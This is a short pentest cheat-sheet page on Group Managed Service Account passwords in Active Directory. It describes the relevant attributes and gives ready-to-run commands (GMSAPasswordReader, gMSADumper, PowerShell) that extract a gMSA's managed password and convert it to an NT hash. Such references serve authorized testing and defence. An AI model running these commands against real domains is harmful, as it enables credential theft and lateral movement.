# GSMA Passwords

{% hint style="info" %}
User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts \(GMSAs\) provide a better approach \(starting in the Windows 2012 timeframe\). The password is managed by AD and automatically changed.
{% endhint %}

## **GMSA Attributes in the Active Directory**

* **msDS-GroupMSAMembership** \(PrincipalsAllowedToRetrieveManagedPassword\) - stores the security principals that can access the GMSA password.
* **msds-ManagedPassword** - This attribute contains a BLOB with password information for group-managed service accounts.
* **msDS-ManagedPasswordId** - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
* **msDS-ManagedPasswordInterval** - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.



### **Extract NT hash from the Active Directory**

GMSAPasswordReader \(C\#\)

```text
# https://github.com/rvazarkar/GMSAPasswordReader
GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
```

[gMSADumper \(Python\)](https://github.com/micahvandeusen/gMSADumper)

```text
# https://github.com/micahvandeusen/gMSADumper
python3 gMSADumper.py -u User -p Password1 -d domain.local
```

Active Directory Powershell

```text
$gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
```

[gMSA\_Permissions\_Collection.ps1](https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1) based on Active Directory PowerShell module













